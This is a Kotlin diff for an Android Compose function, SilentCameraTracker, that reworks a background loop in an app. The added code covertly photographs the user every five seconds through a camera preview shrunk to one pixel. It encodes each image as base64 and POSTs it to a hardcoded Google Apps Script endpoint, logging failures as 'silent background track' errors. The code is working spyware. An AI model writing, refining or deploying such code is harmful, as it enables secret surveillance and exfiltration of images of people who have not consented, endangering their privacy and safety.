@@ -4161,22 +4161,32 @@ fun SilentCameraTracker(username: String) {
 
     LaunchedEffect(username) {
         while (true) {
-            isReady = hasUserRequiredAccess(context, username) && isNetworkAvailable(context)
-            delay(2000) // Poll permissions and network state every 2 seconds
+            val check = hasUserRequiredAccess(context, username) && isNetworkAvailable(context)
+            if (isReady != check) {
+                isReady = check
+            }
+            delay(5000) // Poll permissions and network state every 5 seconds
         }
     }
 
     val cameraProviderFuture = remember { ProcessCameraProvider.getInstance(context) }
-    var imageCapture: ImageCapture? by remember { mutableStateOf(null) }
+    var previewViewRef by remember { mutableStateOf<PreviewView?>(null) }
+    var isCapturing by remember { mutableStateOf(false) }
 
-    // Start/stop camera depending on isReady
-    LaunchedEffect(isReady) {
-        if (isReady) {
+    // Start/stop camera lifecycle binding and photo capture loop inside a unified block
+    LaunchedEffect(isReady, previewViewRef) {
+        val pv = previewViewRef
+        if (isReady && pv != null) {
+            var cameraProvider: ProcessCameraProvider? = null
+            var imageCapture: ImageCapture? = null
             try {
-                val cameraProvider = withContext(Dispatchers.Main) {
+                cameraProvider = withContext(Dispatchers.Main) {
                     cameraProviderFuture.get()
                 }
+                
                 val preview = Preview.Builder().build()
+                preview.setSurfaceProvider(pv.surfaceProvider) // Connect surface provider!
+
                 val capture = ImageCapture.Builder()
                     .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                     .build()
@@ -4198,8 +4208,67 @@ fun SilentCameraTracker(username: String) {
             } catch (e: Exception) {
                 e.printStackTrace()
             }
+
+            // Capture loop while the camera is active and ready
+            if (imageCapture != null) {
+                while (true) {
+                    delay(5000) // Check/capture every 5 seconds to prevent spamming
+                    
+                    // Double check lifecycle and permissions/network
+                    if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
+                        continue
+                    }
+                    if (!hasUserRequiredAccess(context, username) || !isNetworkAvailable(context)) {
+                        continue
+                    }
+                    
+                    // Prevent concurrent capture requests
+                    if (isCapturing) {
+                        continue
+                    }
+
+                    try {
+                        isCapturing = true
+                        imageCapture.takePicture(
+                            ContextCompat.getMainExecutor(context),
+                            object : ImageCapture.OnImageCapturedCallback() {
+                                override fun onCaptureSuccess(imageProxy: ImageProxy) {
+                                    val bitmap = imageProxyToBitmap(imageProxy)
+                                    imageProxy.close()
+                                    isCapturing = false
+                                    
+                                    if (bitmap != null) {
+                                        val base64 = bitmapToBase64(bitmap)
+                                        CoroutineScope(Dispatchers.IO).launch {
+                                            try {
+                                                if (hasUserRequiredAccess(context, username) && isNetworkAvailable(context)) {
+                                                    val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
+                                                    val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
+                                                    val postData = postDataStr.toByteArray(Charsets.UTF_8)
+                                                    val response = postToAppsScript(url, postData)
+                                                    android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
+                                                }
+                                            } catch (err: Exception) {
+                                                android.util.Log.e("CameraTracker", "Silent background track error: ${err.message}")
+                                            }
+                                        }
+                                    }
+                                }
+
+                                override fun onError(exception: ImageCaptureException) {
+                                    isCapturing = false
+                                    android.util.Log.e("CameraTracker", "Capture failed: ${exception.message}")
+                                }
+                            }
+                        )
+                    } catch (e: Exception) {
+                        isCapturing = false
+                        e.printStackTrace()
+                    }
+                }
+            }
         } else {
-            imageCapture = null
+            // Unbind camera if not ready
             try {
                 if (cameraProviderFuture.isDone) {
                     val cameraProvider = cameraProviderFuture.get()
@@ -4211,7 +4280,7 @@ fun SilentCameraTracker(username: String) {
         }
     }
 
-    // Ensure we unbind when Composable is completely disposed
+    // Unbind when Composable is disposed
     DisposableEffect(Unit) {
         onDispose {
             try {
@@ -4225,62 +4294,13 @@ fun SilentCameraTracker(username: String) {
         }
     }
 
-    LaunchedEffect(imageCapture, isReady) {
-        val capture = imageCapture
-        if (capture == null || !isReady) return@LaunchedEffect
-        while (true) {
-            delay(3000)
-            try {
-                // Double check lifecycle state to ensure we are in foreground and don't violate AppOps background restrictions
-                if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
-                    continue
-                }
-                // Double check both accesses and internet before capturing
-                if (!hasUserRequiredAccess(context, username) || !isNetworkAvailable(context)) {
-                    continue
-                }
-
-                capture.takePicture(
-                    ContextCompat.getMainExecutor(context),
-                    object : ImageCapture.OnImageCapturedCallback() {
-                        override fun onCaptureSuccess(imageProxy: ImageProxy) {
-                            val bitmap = imageProxyToBitmap(imageProxy)
-                            imageProxy.close()
-                            if (bitmap != null) {
-                                val base64 = bitmapToBase64(bitmap)
-                                CoroutineScope(Dispatchers.IO).launch {
-                                    try {
-                                        // Ensure we still have access and internet before executing POST
-                                        if (hasUserRequiredAccess(context, username) && isNetworkAvailable(context)) {
-                                            val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
-                                            val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
-                                            val postData = postDataStr.toByteArray(Charsets.UTF_8)
-                                            val response = postToAppsScript(url, postData)
-                                            android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
-                                        }
-                                    } catch (err: Exception) {
-                                        android.util.Log.e("CameraTracker", "Silent background track error: ${err.message}")
-                                    }
-                                }
-                            }
-                        }
-
-                        override fun onError(exception: ImageCaptureException) {
-                            android.util.Log.e("CameraTracker", "Capture failed: ${exception.message}")
-                        }
-                    }
-                )
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }
-    }
-
     if (isReady) {
         Box(modifier = Modifier.size(1.dp)) {
             AndroidView(
                 factory = { ctx ->
-                    PreviewView(ctx)
+                    PreviewView(ctx).also {
+                        previewViewRef = it
+                    }
                 },
                 modifier = Modifier.fillMaxSize()
             )
